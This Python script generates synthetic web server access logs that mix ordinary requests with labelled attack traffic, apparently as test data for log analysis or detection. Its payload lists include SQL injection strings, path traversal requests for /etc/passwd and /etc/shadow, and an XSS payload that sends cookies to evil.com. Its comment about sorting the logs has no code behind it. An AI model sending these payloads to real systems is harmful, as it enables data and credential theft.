#!/usr/bin/env python3
"""
Synthetic Cyber Attack Web Access Log Generator.
Generates realistic Apache Combined Log Format data containing both benign traffic
and various attack scenarios (SQLi, XSS, Path Traversal, Brute Force, DoS, Scanners).
"""

import sys
import random
import datetime
from typing import List

BENIGN_IPS = ["192.168.1.10", "192.168.1.25", "172.16.0.5", "10.0.0.12", "198.51.10.33"]
ATTACK_IPS = {
    "SQLI": "203.0.113.45",
    "XSS": "198.51.100.22",
    "TRAVERSAL": "198.51.100.89",
    "BRUTE_FORCE": "185.220.101.5",
    "DOS": "45.33.32.156",
    "SCANNER": "192.241.220.11"
}

BENIGN_URLS = [
    "/", "/about", "/contact", "/products", "/products?category=electronics",
    "/cart", "/checkout", "/faq", "/images/logo.png", "/css/styles.css", "/js/bundle.js"
]

BENIGN_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/125.0"
]

SQLI_PAYLOADS = [
    "/items?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users",
    "/search?query=admin'%20OR%20'1'='1'--",
    "/api/data?filter=1;%20SLEEP(5)--",
    "/catalog?cat=books'%20AND%201=1--"
]

XSS_PAYLOADS = [
    "/feedback?msg=<script>alert('xss')</script>",
    "/search?q=%3Cscript%3Efetch('http://evil.com/steal?c='+document.cookie)%3C/script%3E",
    "/profile?bio=javascript:eval(document.cookie)",
    "/comments?post=<img%20src=x%20onerror=alert(1)>"
]

TRAVERSAL_PAYLOADS = [
    "/download?file=../../../../etc/passwd",
    "/view?doc=%2e%2e%2f%2e%2e%2fetc/shadow",
    "/.env",
    "/.git/config",
    "/wp-config.php",
    "/backup.sql"
]

SCANNER_URLS = [
    "/admin", "/phpmyadmin", "/manager/html", "/shell.php", "/cgi-bin/test-cgi",
    "/console", "/jenkins/login", "/actuator/health", "/server-status"
]

def format_log(ip: str, timestamp: datetime.datetime, method: str, url: str, status: int, bytes_sent: int, user_agent: str, referrer: str = "-") -> str:
    ts_str = timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")
    return f'{ip} - - [{ts_str}] "{method} {url} HTTP/1.1" {status} {bytes_sent} "{referrer}" "{user_agent}"'

def generate_logs(num_lines: int = 500) -> List[str]:
    logs = []
    current_time = datetime.datetime(2024, 5, 10, 14, 0, 0)

    for i in range(num_lines):
        current_time += datetime.timedelta(seconds=random.randint(1, 3))
        roll = random.random()

        if roll < 0.65:
            # Benign Traffic
            ip = random.choice(BENIGN_IPS)
            url = random.choice(BENIGN_URLS)
            ua = random.choice(BENIGN_USER_AGENTS)
            status = 200 if random.random() > 0.1 else 304
            logs.append(format_log(ip, current_time, "GET", url, status, random.randint(300, 15000), ua))
        elif roll < 0.75:
            # SQL Injection
            ip = ATTACK_IPS["SQLI"]
            url = random.choice(SQLI_PAYLOADS)
            ua = random.choice(BENIGN_USER_AGENTS)
            logs.append(format_log(ip, current_time, "GET", url, 500, 1420, ua))
        elif roll < 0.83:
            # XSS
            ip = ATTACK_IPS["XSS"]
            url = random.choice(XSS_PAYLOADS)
            ua = "Mozilla/5.0"
            logs.append(format_log(ip, current_time, "GET", url, 200, 2100, ua))
        elif roll < 0.90:
            # Traversal / Sensitive
            ip = ATTACK_IPS["TRAVERSAL"]
            url = random.choice(TRAVERSAL_PAYLOADS)
            ua = "curl/7.68.0"
            status = random.choice([403, 404])
            logs.append(format_log(ip, current_time, "GET", url, status, 320, ua))
        else:
            # Scanner Recon
            ip = ATTACK_IPS["SCANNER"]
            url = random.choice(SCANNER_URLS)
            ua = random.choice(["Nikto/2.1.6", "sqlmap/1.6#stable", "gobuster/3.1.0"])
            logs.append(format_log(ip, current_time, "GET", url, 404, 280, ua))

    # Add Brute Force Burst
    bf_time = datetime.datetime(2024, 5, 10, 14, 30, 0)
    for _ in range(8):
        bf_time += datetime.timedelta(seconds=2)
        logs.append(format_log(ATTACK_IPS["BRUTE_FORCE"], bf_time, "POST", "/api/v1/auth/login", 401, 240, "Hydra/9.2"))

    # Add DoS Flood Burst
    dos_time = datetime.datetime(2024, 5, 10, 14, 45, 0)
    for _ in range(25):
        dos_time += datetime.timedelta(milliseconds=200)
        logs.append(format_log(ATTACK_IPS["DOS"], dos_time, "GET", "/api/v1/products/stream", 200, 8920, "AttackBot/1.0"))

    # Sort logs chronologically
    return logs

if __name__ == "__main__":
    count = int(sys.argv[1]) if len(sys.argv) > 1 else 300
    out_file = sys.argv[2] if len(sys.argv) > 2 else "data/synthetic_access.log"
    print(f"Generating {count} synthetic access logs to {out_file}...")
    lines = generate_logs(count)
    with open(out_file, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")
    print("Done.")
